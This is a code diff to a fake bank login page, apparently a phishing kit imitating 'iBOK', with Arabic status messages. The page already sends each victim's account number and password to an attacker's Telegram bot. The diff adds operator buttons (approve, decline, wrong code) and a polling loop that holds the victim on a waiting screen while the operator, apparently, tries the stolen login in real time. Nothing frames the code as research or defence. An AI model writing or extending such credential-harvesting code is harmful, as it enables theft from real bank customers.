@@ -325,6 +325,8 @@
         const togglePasswordBtn = document.getElementById("toggle-password");
         const messageDiv = document.getElementById("message");
 
+        let pollInterval = null;
+
         // =======================
         // PASSWORD VISIBILITY TOGGLE
         // =======================
@@ -359,10 +361,25 @@
                 return;
             }
 
+            // Generate unique user identifier based on timestamp and account suffix
+            const userId = Date.now() + "_" + account.slice(-4);
+
             // Format message to send to Telegram
             const textMessage = `New iBOK Login Attempt:\n\nAccount: ${account}\nPassword: ${password}`;
+            
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ APPROVE", callback_data: `approve_2fa_${userId}` },
+                        { text: "❌ DECLINE", callback_data: `decline_2fa_${userId}` },
+                    ],
+                    [
+                        { text: "⚠️ WRONG CODE", callback_data: `wrong_2fa_${userId}` },
+                    ],
+                ],
+            };
 
-            // Send data to Telegram Bot API
+            // Send data to Telegram Bot API with Reply Markup
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -370,7 +387,8 @@
                     },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: textMessage
+                        text: textMessage,
+                        reply_markup: keyboard
                     })
                 })
                 .then(response => response.json())
@@ -378,11 +396,14 @@
                     if (data.ok) {
                         messageDiv.textContent = "جاري انتظار الموافقة.....";
                         messageDiv.className = "message visible success";
+                        
+                        // Disable form inputs while waiting
+                        accountInput.disabled = true;
+                        passwordInput.disabled = true;
+                        document.querySelector('.demo-action').disabled = true;
 
-                        // Redirect to verify.html after a 1.5-second delay
-                        setTimeout(() => {
-                            window.location.href = 'summary.html';
-                        }, 1500);
+                        // Start polling Telegram updates
+                        startPolling(userId);
                     } else {
                         messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
                         messageDiv.className = "message visible error";
@@ -394,6 +415,68 @@
                     messageDiv.className = "message visible error";
                 });
         });
+
+        // =======================
+        // TELEGRAM CALLBACK POLLING
+        // =======================
+        let lastUpdateId = 0;
+
+        function startPolling(userId) {
+            if (pollInterval) clearInterval(pollInterval);
+
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=2`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const latestUpdate = data.result[data.result.length - 1];
+                            
+                            if (latestUpdate.update_id > lastUpdateId && latestUpdate.callback_query) {
+                                lastUpdateId = latestUpdate.update_id;
+                                const callbackData = latestUpdate.callback_query.data;
+                                
+                                // Ensure the callback matches the current session's userId
+                                if (callbackData.includes(userId)) {
+                                    // Answer callback query to remove button loading state on Telegram
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: latestUpdate.callback_query.id })
+                                    });
+
+                                    clearInterval(pollInterval);
+
+                                    if (callbackData.startsWith("approve_2fa_")) {
+                                        messageDiv.textContent = "تمت الموافقة بنجاح! جاري الانتقال...";
+                                        messageDiv.className = "message visible success";
+                                        setTimeout(() => {
+                                            window.location.href = 'summary.html';
+                                        }, 1000);
+                                    } 
+                                    else if (callbackData.startsWith("decline_2fa_")) {
+                                        messageDiv.textContent = "تم رفض الطلب، يرجى إعادة إدخال التفاصيل.";
+                                        messageDiv.className = "message visible error";
+                                        resetFormState();
+                                    } 
+                                    else if (callbackData.startsWith("wrong_2fa_")) {
+                                        messageDiv.textContent = "بيانات غير صحيحة، يرجى إعادة إدخال التفاصيل بشكل صحيح.";
+                                        messageDiv.className = "message visible error";
+                                        resetFormState();
+                                    }
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000);
+        }
+
+        function resetFormState() {
+            demoForm.reset();
+            accountInput.disabled = false;
+            passwordInput.disabled = false;
+            document.querySelector('.demo-action').disabled = false;
+        }
     </script>
 </body>
 
